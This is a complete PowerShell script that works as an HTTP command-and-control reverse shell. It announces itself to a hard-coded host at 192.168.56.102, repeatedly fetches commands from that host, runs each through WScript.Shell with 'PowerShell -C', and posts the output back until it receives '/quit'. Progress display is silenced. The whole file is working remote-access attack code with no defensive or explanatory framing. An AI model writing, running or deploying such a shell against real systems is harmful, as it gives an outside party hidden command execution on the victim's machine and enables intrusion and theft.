$shell = New-Object -ComObject WScript.Shell
$uri = "192.168.56.102"
$ProgressPreference = "SilentlyContinue"
$trash = Invoke-WebRequest -Uri $uri -Method POST -Body "New Connection!"

while ($TRUE){
    $gResp = Invoke-WebRequest -Uri $uri -Method GET
    if($gResp.Content -eq "/quit"){
        Invoke-WebRequest -Uri $uri -Method POST -Body "Connection Closed!"
        break
    }
    #$exec = $shell.Exec("cmd /C " + $gResp.Content)
    $exec = $shell.Exec("PowerShell -C " + $gResp.Content)
    $output = ($exec.StdOut.ReadAll() | Out-String)
    $pResp = Invoke-WebRequest -Uri $uri -Method POST -Body $output
}

